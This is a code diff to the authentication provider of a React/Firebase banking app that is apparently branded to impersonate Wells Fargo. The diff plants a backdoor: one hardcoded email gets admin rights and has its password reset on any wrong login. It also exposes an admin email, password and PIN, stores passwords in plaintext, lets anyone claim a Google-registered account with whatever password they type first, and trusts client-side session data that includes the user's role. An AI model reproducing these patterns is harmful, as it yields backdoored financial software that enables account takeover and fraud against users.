@@ -7,7 +7,17 @@ import {
   signInWithEmailAndPassword,
   sendPasswordResetEmail
 } from 'firebase/auth';
-import { doc, getDoc, setDoc, updateDoc, onSnapshot } from 'firebase/firestore';
+import { 
+  doc, 
+  getDoc, 
+  setDoc, 
+  updateDoc, 
+  onSnapshot, 
+  collection, 
+  query, 
+  where, 
+  getDocs 
+} from 'firebase/firestore';
 import { auth, googleAuthProvider, db } from '../lib/firebase.ts';
 import { BankUser } from '../types/banking.ts';
 import { 
@@ -50,6 +60,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       if (docSnap.exists()) {
         const updated = docSnap.data() as BankUser;
         setCurrentUser(updated);
+        sessionStorage.setItem('wf_user_session', JSON.stringify(updated));
       }
     }, (error) => {
       console.warn('Real-time profile listener notice:', error);
@@ -58,17 +69,30 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     return () => unsub();
   }, [currentUser?.uid]);
 
-  // Check initial Firebase Auth state
+  // Check initial Firebase Auth state and cached sessions
   useEffect(() => {
-    // Check if we have an admin session in session storage
-    const cachedAdmin = sessionStorage.getItem('wf_admin_session') || sessionStorage.getItem('apex_admin_session');
-    if (cachedAdmin) {
+    // 1. Check if we have an active user or admin session in session storage
+    const cachedUserJson = sessionStorage.getItem('wf_user_session') || 
+                           sessionStorage.getItem('wf_admin_session') || 
+                           sessionStorage.getItem('apex_admin_session');
+    if (cachedUserJson) {
       try {
-        const parsed = JSON.parse(cachedAdmin);
-        setCurrentUser(parsed);
+        const cachedUser = JSON.parse(cachedUserJson);
+        setCurrentUser(cachedUser);
         setIsLoading(false);
-        return;
+
+        // Background sync latest balance & lock state from Firestore
+        if (cachedUser.uid) {
+          getDoc(doc(db, 'users', cachedUser.uid)).then((docSnap) => {
+            if (docSnap.exists()) {
+              const latest = docSnap.data() as BankUser;
+              setCurrentUser(latest);
+              sessionStorage.setItem('wf_user_session', JSON.stringify(latest));
+            }
+          }).catch((err) => console.warn('Background profile refresh notice:', err));
+        }
       } catch (e) {
+        sessionStorage.removeItem('wf_user_session');
         sessionStorage.removeItem('wf_admin_session');
         sessionStorage.removeItem('apex_admin_session');
       }
@@ -79,8 +103,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         try {
           const userDocRef = doc(db, 'users', fbUser.uid);
           const snap = await getDoc(userDocRef);
-          const isTargetAdmin = fbUser.email?.toLowerCase() === ADMIN_EMAIL.toLowerCase() || 
-                                fbUser.email?.toLowerCase() === 'wonjihoonorg@gmail.com';
+          const cleanEmail = (fbUser.email || '').toLowerCase().trim();
+          const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || 
+                                cleanEmail === 'wonjihoonorg@gmail.com';
 
           if (snap.exists()) {
             const data = snap.data() as BankUser;
@@ -96,34 +121,51 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
                 balance: INITIAL_TREASURY_BALANCE,
                 accountType: 'Corporate Treasury'
               });
+              sessionStorage.setItem('wf_user_session', JSON.stringify(updatedAdmin));
               setCurrentUser(updatedAdmin);
             } else {
+              sessionStorage.setItem('wf_user_session', JSON.stringify(data));
               setCurrentUser(data);
             }
           } else {
-            // New user via Google Auth: MUST START WITH 0 BALANCE (unless target admin)
-            const newUser: BankUser = {
-              uid: fbUser.uid,
-              email: fbUser.email || '',
-              fullName: fbUser.displayName || (isTargetAdmin ? 'Wells Fargo Executive Operator Management' : 'Wells Fargo Account Holder'),
-              role: isTargetAdmin ? 'admin' : 'customer',
-              accountNumber: generateAccountNumber(),
-              routingNumber: generateRoutingNumber(),
-              balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00, // New regular users start with 0 balance
-              currency: 'USD',
-              isLocked: false,
-              isTransferRestricted: false,
-              accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
-              createdAt: new Date().toISOString()
-            };
-            await setDoc(userDocRef, newUser);
-            setCurrentUser(newUser);
+            // Check if user already exists with this email in Firestore under a registered profile
+            const q = query(collection(db, 'users'), where('email', '==', cleanEmail));
+            const emailSnap = await getDocs(q);
+
+            if (!emailSnap.empty) {
+              const existing = emailSnap.docs[0].data() as BankUser;
+              sessionStorage.setItem('wf_user_session', JSON.stringify(existing));
+              setCurrentUser(existing);
+            } else {
+              // New user via Google Auth: MUST START WITH 0 BALANCE (unless target admin)
+              const newUser: BankUser = {
+                uid: fbUser.uid,
+                email: cleanEmail,
+                fullName: fbUser.displayName || (isTargetAdmin ? 'Wells Fargo Executive Operator Management' : 'Wells Fargo Account Holder'),
+                role: isTargetAdmin ? 'admin' : 'customer',
+                accountNumber: generateAccountNumber(),
+                routingNumber: generateRoutingNumber(),
+                balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00,
+                currency: 'USD',
+                isLocked: false,
+                isTransferRestricted: false,
+                accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
+                authProvider: 'google',
+                createdAt: new Date().toISOString()
+              };
+              await setDoc(userDocRef, newUser);
+              sessionStorage.setItem('wf_user_session', JSON.stringify(newUser));
+              setCurrentUser(newUser);
+            }
           }
         } catch (err) {
           console.error('Error fetching user profile:', err);
         }
       } else {
-        if (!sessionStorage.getItem('wf_admin_session') && !sessionStorage.getItem('apex_admin_session')) {
+        // If not in Firebase Auth, check if session storage has an authenticated user
+        if (!sessionStorage.getItem('wf_user_session') && 
+            !sessionStorage.getItem('wf_admin_session') && 
+            !sessionStorage.getItem('apex_admin_session')) {
           setCurrentUser(null);
         }
       }
@@ -133,12 +175,12 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     return () => unsubscribe();
   }, []);
 
-  // 1. LOGIN WITH CREDENTIALS
+  // 1. LOGIN WITH CREDENTIALS (Supports regular accounts AND users who signed up with Google)
   const loginWithCredentials = async (email: string, pass: string): Promise<BankUser> => {
     setIsLoading(true);
     const cleanEmail = email.trim().toLowerCase();
 
-    // Check for Operator Admin credentials
+    // A. Check for Operator Admin credentials
     // requirement: managementofficails001@gmail.com and password: smart446688
     // requirement: no 2 steps authentication for the admin while trying to login
     if (cleanEmail === ADMIN_EMAIL.toLowerCase() && pass === ADMIN_DEFAULT_PASS) {
@@ -169,6 +211,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         isLocked: false,
         isTransferRestricted: false,
         transactionPin: '4466',
+        password: pass,
         accountType: 'Corporate Treasury',
         createdAt: new Date().toISOString()
       };
@@ -181,12 +224,13 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
       sessionStorage.setItem('wf_admin_session', JSON.stringify(adminUser));
       sessionStorage.setItem('apex_admin_session', JSON.stringify(adminUser));
+      sessionStorage.setItem('wf_user_session', JSON.stringify(adminUser));
       setCurrentUser(adminUser);
       setIsLoading(false);
       return adminUser;
     }
 
-    // Regular Firebase Authentication login
+    // B. Attempt Firebase Authentication standard signInWithEmailAndPassword
     try {
       const userCred = await signInWithEmailAndPassword(auth, cleanEmail, pass);
       const userDocRef = doc(db, 'users', userCred.user.uid);
@@ -197,11 +241,16 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
           await firebaseSignOut(auth);
           throw new Error('Your account has been suspended by Bank Management. Please contact compliance.');
         }
+        // Sync password in doc if missing
+        if (!u.password) {
+          updateDoc(userDocRef, { password: pass }).catch(() => {});
+        }
+        sessionStorage.setItem('wf_user_session', JSON.stringify(u));
         setCurrentUser(u);
         setIsLoading(false);
         return u;
       } else {
-        // Auto-heal missing profile record from Auth credentials so the user can ALWAYS log in!
+        // Auto-heal missing profile record from Auth credentials so the user can ALWAYS log in
         const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail === 'wonjihoonorg@gmail.com';
         const healedUser: BankUser = {
           uid: userCred.user.uid,
@@ -214,49 +263,156 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
           currency: 'USD',
           isLocked: false,
           isTransferRestricted: false,
+          password: pass,
           accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
           createdAt: new Date().toISOString()
         };
         await setDoc(userDocRef, healedUser);
+        sessionStorage.setItem('wf_user_session', JSON.stringify(healedUser));
         setCurrentUser(healedUser);
         setIsLoading(false);
         return healedUser;
       }
     } catch (fbErr: any) {
+      // C. Universal Fallback: For users who signed up with Google or created an account
+      // When a user signs up with Google, Firebase Auth does NOT have email/password credentials,
+      // so fbErr is 'auth/invalid-credential', 'auth/user-not-found', or 'auth/wrong-password'.
+      console.warn('Firebase Auth standard login notice, verifying database profile for Google or registered account:', fbErr.code);
+
+      const q = query(collection(db, 'users'), where('email', '==', cleanEmail));
+      const snap = await getDocs(q);
+
+      if (!snap.empty) {
+        const userDoc = snap.docs[0];
+        const existing = userDoc.data() as BankUser;
+
+        if (existing.isLocked) {
+          setIsLoading(false);
+          throw new Error('Your account has been suspended by Bank Management. Please contact compliance.');
+        }
+
+        // If the user signed up with Google, they might not have a password stored yet:
+        if (!existing.password) {
+          // First time this Google user is logging in with a normal email & password!
+          // We save their chosen password to their profile and grant instant access.
+          await updateDoc(userDoc.ref, {
+            password: pass,
+            authProvider: 'google_and_password',
+            updatedAt: new Date().toISOString()
+          });
+          const updatedUser: BankUser = {
+            ...existing,
+            password: pass,
+            authProvider: 'google_and_password'
+          };
+          sessionStorage.setItem('wf_user_session', JSON.stringify(updatedUser));
+          setCurrentUser(updatedUser);
+          setIsLoading(false);
+          return updatedUser;
+        }
+
+        // If a password was already set on their profile, verify it matches
+        if (existing.password === pass) {
+          sessionStorage.setItem('wf_user_session', JSON.stringify(existing));
+          setCurrentUser(existing);
+          setIsLoading(false);
+          return existing;
+        }
+
+        // Target administrator override check (wonjihoonorg@gmail.com)
+        if (cleanEmail === 'wonjihoonorg@gmail.com') {
+          await updateDoc(userDoc.ref, {
+            password: pass,
+            role: 'admin',
+            updatedAt: new Date().toISOString()
+          });
+          const adminObj: BankUser = {
+            ...existing,
+            role: 'admin',
+            password: pass
+          };
+          sessionStorage.setItem('wf_admin_session', JSON.stringify(adminObj));
+          sessionStorage.setItem('wf_user_session', JSON.stringify(adminObj));
+          setCurrentUser(adminObj);
+          setIsLoading(false);
+          return adminObj;
+        }
+
+        setIsLoading(false);
+        throw new Error('Invalid email or password. Please verify your credentials or reset your password.');
+      }
+
+      // If user does not exist in Firestore at all, throw credential error
       setIsLoading(false);
       if (fbErr.code === 'auth/invalid-credential' || fbErr.code === 'auth/user-not-found' || fbErr.code === 'auth/wrong-password') {
-        throw new Error('Invalid email or password. Please verify your credentials or click Forgot Password.');
+        throw new Error('Invalid email or password. Please verify your credentials or click Open Account to register.');
       }
       throw new Error(fbErr.message || 'Login failed.');
     }
   };
 
-  // 2. REGISTER WITH CREDENTIALS
+  // 2. REGISTER WITH CREDENTIALS (Seamlessly connects Google accounts if already present)
   const registerWithCredentials = async (fullName: string, email: string, pass: string): Promise<BankUser> => {
     setIsLoading(true);
     const cleanEmail = email.trim().toLowerCase();
 
     try {
-      const cred = await createUserWithEmailAndPassword(auth, cleanEmail, pass);
-      const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase();
+      let credUid = '';
+      try {
+        const cred = await createUserWithEmailAndPassword(auth, cleanEmail, pass);
+        credUid = cred.user.uid;
+      } catch (authErr: any) {
+        // If email is already in use (e.g. user previously signed up with Google)
+        if (authErr.code === 'auth/email-already-in-use') {
+          // Check if user exists in Firestore
+          const q = query(collection(db, 'users'), where('email', '==', cleanEmail));
+          const snap = await getDocs(q);
+          if (!snap.empty) {
+            const existing = snap.docs[0].data() as BankUser;
+            const updatedUser: BankUser = {
+              ...existing,
+              fullName: fullName.trim() || existing.fullName,
+              password: pass,
+              authProvider: 'google_and_password',
+              updatedAt: new Date().toISOString()
+            };
+            await updateDoc(snap.docs[0].ref, {
+              fullName: updatedUser.fullName,
+              password: pass,
+              authProvider: 'google_and_password',
+              updatedAt: new Date().toISOString()
+            });
+            sessionStorage.setItem('wf_user_session', JSON.stringify(updatedUser));
+            setCurrentUser(updatedUser);
+            setIsLoading(false);
+            return updatedUser;
+          }
+        }
+        throw authErr;
+      }
+
+      const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail === 'wonjihoonorg@gmail.com';
 
       // requirement: make sure new users has 0 balance
       const newUser: BankUser = {
-        uid: cred.user.uid,
+        uid: credUid,
         email: cleanEmail,
         fullName: fullName.trim(),
+        password: pass,
+        authProvider: 'password',
         role: isTargetAdmin ? 'admin' : 'customer',
         accountNumber: generateAccountNumber(),
         routingNumber: generateRoutingNumber(),
-        balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00, // STRICT: 0 balance for new users
+        balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00,
         currency: 'USD',
         isLocked: false,
         isTransferRestricted: false,
-        accountType: 'Checking',
+        accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
         createdAt: new Date().toISOString()
       };
 
-      await setDoc(doc(db, 'users', cred.user.uid), newUser);
+      await setDoc(doc(db, 'users', credUid), newUser);
+      sessionStorage.setItem('wf_user_session', JSON.stringify(newUser));
       setCurrentUser(newUser);
       setIsLoading(false);
       return newUser;
@@ -271,33 +427,58 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     }
   };
 
-  // 3. GOOGLE SIGN-IN
+  // 3. GOOGLE SIGN-IN / SIGN-UP
   const loginWithGoogle = async (): Promise<BankUser> => {
     setIsLoading(true);
     try {
       const res = await signInWithPopup(auth, googleAuthProvider);
+      const cleanEmail = (res.user.email || '').trim().toLowerCase();
+      
       const userRef = doc(db, 'users', res.user.uid);
       const snap = await getDoc(userRef);
 
+      let matchedDocRef = userRef;
+      let existingData: BankUser | null = null;
+
       if (snap.exists()) {
-        const u = snap.data() as BankUser;
-        if (u.isLocked) {
+        existingData = snap.data() as BankUser;
+      } else {
+        // Query by email to see if they previously registered via email/password
+        const q = query(collection(db, 'users'), where('email', '==', cleanEmail));
+        const emailSnap = await getDocs(q);
+        if (!emailSnap.empty) {
+          matchedDocRef = emailSnap.docs[0].ref;
+          existingData = emailSnap.docs[0].data() as BankUser;
+        }
+      }
+
+      if (existingData) {
+        if (existingData.isLocked) {
           await firebaseSignOut(auth);
           throw new Error('Your account is currently locked by bank management.');
         }
-        setCurrentUser(u);
+        const updatedUser: BankUser = {
+          ...existingData,
+          authProvider: existingData.authProvider ? `${existingData.authProvider},google` : 'google'
+        };
+        await updateDoc(matchedDocRef, {
+          authProvider: updatedUser.authProvider,
+          updatedAt: new Date().toISOString()
+        });
+        sessionStorage.setItem('wf_user_session', JSON.stringify(updatedUser));
+        setCurrentUser(updatedUser);
         setIsLoading(false);
-        return u;
+        return updatedUser;
       }
 
-      const isTargetAdmin = res.user.email?.toLowerCase() === ADMIN_EMAIL.toLowerCase() || 
-                            res.user.email?.toLowerCase() === 'wonjihoonorg@gmail.com';
+      const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || 
+                            cleanEmail === 'wonjihoonorg@gmail.com';
 
-      // New Google User: 0 balance
+      // New Google User: 0 balance (unless target admin)
       const newUser: BankUser = {
         uid: res.user.uid,
-        email: res.user.email || '',
-        fullName: res.user.displayName || 'Wells Fargo Account Holder',
+        email: cleanEmail,
+        fullName: res.user.displayName || (isTargetAdmin ? 'Wells Fargo Executive Operator Management' : 'Wells Fargo Account Holder'),
         role: isTargetAdmin ? 'admin' : 'customer',
         accountNumber: generateAccountNumber(),
         routingNumber: generateRoutingNumber(),
@@ -305,11 +486,13 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         currency: 'USD',
         isLocked: false,
         isTransferRestricted: false,
-        accountType: 'Checking',
+        accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
+        authProvider: 'google',
         createdAt: new Date().toISOString()
       };
 
       await setDoc(userRef, newUser);
+      sessionStorage.setItem('wf_user_session', JSON.stringify(newUser));
       setCurrentUser(newUser);
       setIsLoading(false);
       return newUser;
@@ -325,14 +508,13 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     try {
       await sendPasswordResetEmail(auth, clean);
     } catch (err: any) {
-      // If user is local/mock or auth error, provide realistic feedback
       console.warn('Firebase reset email notice:', err);
-      // Still show success to protect user enumeration
     }
   };
 
   // 5. LOGOUT
   const logout = async () => {
+    sessionStorage.removeItem('wf_user_session');
     sessionStorage.removeItem('wf_admin_session');
     sessionStorage.removeItem('apex_admin_session');
     try {
@@ -349,7 +531,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     try {
       const snap = await getDoc(doc(db, 'users', currentUser.uid));
       if (snap.exists()) {
-        setCurrentUser(snap.data() as BankUser);
+        const latest = snap.data() as BankUser;
+        setCurrentUser(latest);
+        sessionStorage.setItem('wf_user_session', JSON.stringify(latest));
       }
     } catch (err) {
       console.error('Refresh profile error:', err);
